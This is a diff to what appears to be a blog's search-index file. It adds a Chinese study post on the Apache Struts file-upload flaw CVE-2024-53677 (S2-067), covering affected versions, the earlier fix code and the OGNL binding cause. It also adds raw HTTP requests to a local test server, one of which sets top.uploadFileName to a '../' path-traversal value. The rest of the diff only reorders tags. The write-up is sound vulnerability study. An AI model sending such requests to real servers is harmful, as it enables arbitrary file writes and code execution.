@@ -4,6 +4,29 @@
   
   
   <entry>
+    <title>CVE-2024-53677(S2-067)学习</title>
+    <link href="/2025/03/10/struts%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B02/"/>
+    <url>/2025/03/10/struts%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B02/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习，AI助我。</p><a id="more"></a><hr><h3 id="CVE-2024-53677-S2-067"><a href="#CVE-2024-53677-S2-067" class="headerlink" title="CVE-2024-53677(S2-067)"></a>CVE-2024-53677(S2-067)</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>CVE-2024-53677是Apache Struts框架中发现的远程代码执行（RCE）漏洞，CVSS评分高达9.5（严重）​。该漏洞源于文件上传逻辑的缺陷，攻击者可通过路径遍历攻击绕过安全限制，上传恶意文件并执行任意代码，可能导致服务器被完全控制、数据泄露等严重后果。</p><p>CVE-2024-53677是Apache Struts框架中文件上传机制的逻辑缺陷，其核心问题在于参数绑定与路径处理的不安全性。攻击者可通过构造特殊参数绕过文件名验证，将恶意文件上传至任意目录。该漏洞是S2-066漏洞的绕过变种，官方曾通过删除同名参数的方式修复旧漏洞，但新漏洞利用OGNL表达式动态修改文件名实现绕过。</p><h4 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h4><p>受影响的Apache Struts版本包括：</p><p>​Struts 2.x系列：2.0.0 - 2.5.33（已停止支持）<br>​Struts 6.x系列：6.0.0 - 6.3.0.2<br>修复版本需升级至6.4.0或更高版本，且需迁移至新的文件上传机制。</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>据说是上一个漏洞的绕过，换一下struts2版本就行：</p><pre><code class="xml">&lt;dependency&gt;  &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;  &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;  &lt;version&gt;6.3.0.2&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>顺便看看上一个漏洞的修复方式，在添加上传文件参数的环节也就是这段代码：</p><pre><code class="java">Map&lt;String, Parameter&gt; newParams = new HashMap&lt;&gt;();newParams.put(inputName, new Parameter.File(inputName, acceptedFiles.toArray(new UploadedFile[acceptedFiles.size()])));newParams.put(contentTypeName, new Parameter.File(contentTypeName, acceptedContentTypes.toArray(new String[acceptedContentTypes.size()])));newParams.put(fileNameName, new Parameter.File(fileNameName, acceptedFileNames.toArray(new String[acceptedFileNames.size()])));ac.getParameters().appendAll(newParams);</code></pre><p>使用的appendAll函数会先进行一次remove：</p><pre><code class="java">public HttpParameters appendAll(Map&lt;String, Parameter&gt; newParams) {    remove(newParams.keySet());    parameters.putAll(newParams);    return this;}</code></pre><p>remove就会忽略大小写，把名字相同的参数删掉，只保留FileUploadInterceptor拿到的过滤后的文件名：</p><pre><code class="java">public HttpParameters remove(Set&lt;String&gt; paramsToRemove) {    for (String paramName : paramsToRemove) {        parameters.entrySet().removeIf(p -&gt; p.getKey().equalsIgnoreCase(paramName));    }    return this;}</code></pre><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>攻击者通过构造包含top.uploadFileName等OGNL表达式的参数，在参数绑定阶段动态修改文件名。例如，利用[0].top.UploadFilename绕过单文件上传场景的验证，将恶意文件名写入服务器。</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>先测试一下aaa.bbb类型的参数会怎么绑定：</p><pre><code>POST /struts2_upload_war_exploded/upload.action?aaa.bbb=test HTTP/1.1Host: www.test.local:8080Cache-Control: max-age=0Referer: http://www.test.local:8080/struts2_upload_war_exploded/Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1QfPbi7wUsDuglB1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Upgrade-Insecure-Requests: 1Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Origin: http://www.test.local:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0Accept-Encoding: gzip, deflateCookie: JSESSIONID=E88CE6974708C3CF0F165E2AC2C36CC1Content-Length: 194------WebKitFormBoundary1QfPbi7wUsDuglB1Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;test.TXT&quot;Content-Type: text/plainflag{test}------WebKitFormBoundary1QfPbi7wUsDuglB1--</code></pre><p>调试发现struts2会将参数名作为一句ognl表达式来处理：</p><pre><code class="java">ognlUtil.setValue(expr, context, root, value);</code></pre><p>而root作为ognl数据栈，被访问的UploadAction可以被ognl表达式的top关键词访问，因此可以通过传递top.uploadFileName参数的方式来修改上传文件名：</p><pre><code>POST /struts2_upload_war_exploded/upload.action?top.uploadFileName=../test.jar HTTP/1.1Host: www.test.local:8080Cache-Control: max-age=0Referer: http://www.test.local:8080/struts2_upload_war_exploded/Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1QfPbi7wUsDuglB1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Upgrade-Insecure-Requests: 1Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Origin: http://www.test.local:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0Accept-Encoding: gzip, deflateCookie: JSESSIONID=E88CE6974708C3CF0F165E2AC2C36CC1Content-Length: 194------WebKitFormBoundary1QfPbi7wUsDuglB1Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;test.TXT&quot;Content-Type: text/plainflag{test}------WebKitFormBoundary1QfPbi7wUsDuglB1--</code></pre><p>需要注意的一点是TreeMap的排序问题，如果将上传name改为upload就会导致覆盖失败，或者像参考文章那样直接将name改为top.uploadFileName应该也是可行的。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>好使，爱使，多使。</p><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cimer.com.cn/newsinfo/7901779.html" target="_blank" rel="noopener">深度解析 Struts2 漏洞 CVE - 2024 - 53677：原理、利用与修复全攻略</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>Java</tag>
+      
+      <tag>Struts2</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>CVE-2023-50164(S2-066)学习</title>
     <link href="/2025/02/28/struts%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     <url>/2025/02/28/struts%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
@@ -364,9 +387,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>XSS</tag>
       
@@ -387,9 +410,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -408,9 +431,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -429,9 +452,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -3314,9 +3337,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>Python</tag>
       
@@ -3423,9 +3446,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>PHP</tag>
       
@@ -3446,9 +3469,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>前端</tag>
       
@@ -3469,9 +3492,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>前端</tag>
       
@@ -3536,9 +3559,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>Web</tag>
+      
+      <tag>Crypto</tag>
       
       <tag>Pwn</tag>
       
@@ -3561,9 +3584,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>FastCGI</tag>
       
@@ -3584,9 +3607,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>Mongodb</tag>
       
@@ -3609,9 +3632,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>Python</tag>
       
@@ -3632,11 +3655,11 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
       
       <tag>Java</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -3718,9 +3741,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -3785,9 +3808,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -3816,9 +3839,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -3837,9 +3860,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>前端</tag>
       
@@ -3881,11 +3904,11 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
       
       <tag>Java</tag>
+      
+      <tag>CTF</tag>
       
       <tag>Spring</tag>
       
@@ -3973,9 +3996,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>Karaf</tag>
       
@@ -4205,9 +4228,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>前端</tag>
       
